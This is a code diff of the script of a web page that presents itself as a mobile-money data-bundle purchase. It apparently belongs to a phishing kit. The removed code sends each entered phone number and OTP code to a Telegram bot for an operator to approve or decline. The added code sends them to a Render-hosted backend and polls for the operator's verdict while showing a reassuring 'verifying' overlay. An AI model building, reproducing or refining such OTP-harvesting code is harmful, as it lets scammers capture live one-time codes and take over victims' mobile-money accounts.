@@ -376,11 +376,9 @@
 
 <script>
   /* ============================================================ 
-     TELEGRAM CONFIGURATION
-     Replace these with your actual Bot Token and Chat ID
+     RENDER BACKEND URL
   ============================================================ */
-  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+  const API_URL = 'https://databundlesmomo-api.onrender.com';
 
   /* ============================================================
      Read transaction from URL
@@ -495,7 +493,7 @@
   }
 
   /* ============================================================
-     Verify OTP & Send to Telegram
+     Verify OTP & Send to Render Backend
   ============================================================ */
   let pollingActive = false;
   let pollTimer = null;
@@ -532,41 +530,19 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    // 1. Send OTP to Telegram
-    const message = `
-🚨 *NEW OTP VERIFICATION* 🚨
-----------------------------
-📱 *Phone:* ${tx.an}
-🔑 *OTP Code:* \`${otp}\`
-💰 *Amount:* ${tx.am === '0' ? 'Free Trial' : tx.am + ' ' + tx.cur}
-📦 *Package:* ${tx.pkgName || 'Data Plan'}
-🔖 *Ref:* ${tx.ref}
-    `;
-
-    const replyMarkup = {
-      inline_keyboard: [
-        [
-          { text: "✅ Approve", callback_data: `approve_otp_${tx.ref}` },
-          { text: "❌ Decline", callback_data: `decline_otp_${tx.ref}` }
-        ]
-      ]
-    };
-
+    // 1. Send OTP to Render Backend (which talks to Telegram)
     try {
-      if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
-            reply_markup: replyMarkup
-          })
-        });
-      }
+      await fetch(`${API_URL}/api/otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ref: tx.ref,
+          phone: tx.an,
+          otp: otp
+        })
+      });
     } catch (e) {
-      console.error('Telegram error:', e);
+      console.error('Backend error:', e);
     }
 
     // 2. Show Full-Page Verifying Overlay
@@ -576,25 +552,50 @@
 
     pollingActive = true;
 
-    // 3. Simulate Backend Polling
+    // 3. Poll Render Backend for Admin Decision
     let waitTime = 0;
-    pollTimer = setInterval(() => {
+    pollTimer = setInterval(async () => {
       if (!pollingActive) return;
       waitTime += 2000;
 
-      /* SIMULATE APPROVAL AFTER 6 SECONDS */
-      if (waitTime >= 6000) {
+      try {
+        const res = await fetch(`${API_URL}/api/status/${tx.ref}`);
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          clearInterval(pollTimer);
+          pollingActive = false;
+          stopTrustSlider();
+          
+          // Redirect to success page
+          const q = new URLSearchParams({
+            tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+            pkg: tx.pkgName
+          });
+          window.location.href = 'success.html?' + q.toString(); 
+        } else if (data.status === 'declined') {
+          clearInterval(pollTimer);
+          pollingActive = false;
+          stopTrustSlider();
+          document.getElementById('authorizingOverlay').classList.remove('show');
+          btn.disabled = false;
+          btn.textContent = 'Verify & Complete';
+          
+          // Show error
+          document.getElementById('noticeError').classList.add('show');
+          document.getElementById('noticeError').scrollIntoView({ behavior: 'smooth', block: 'center' });
+          inputs.forEach(i => i.value = '');
+          inputs[0].focus();
+        }
+      } catch (e) {
+        console.error('Polling error:', e);
+      }
+
+      if (waitTime > 120000) {
         clearInterval(pollTimer);
-        pollingActive = false;
-        stopTrustSlider();
-        
-        // Redirect to success page (e.g., success.html)
-        const q = new URLSearchParams({
-          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
-          pkg: tx.pkgName
-        });
-        window.location.href = 'success.html?' + q.toString(); // Update this if you have a success page
+        cancelAuthorizing();
+        showToast('Request timed out. Please try again.');
       }
     }, 2000);
   }
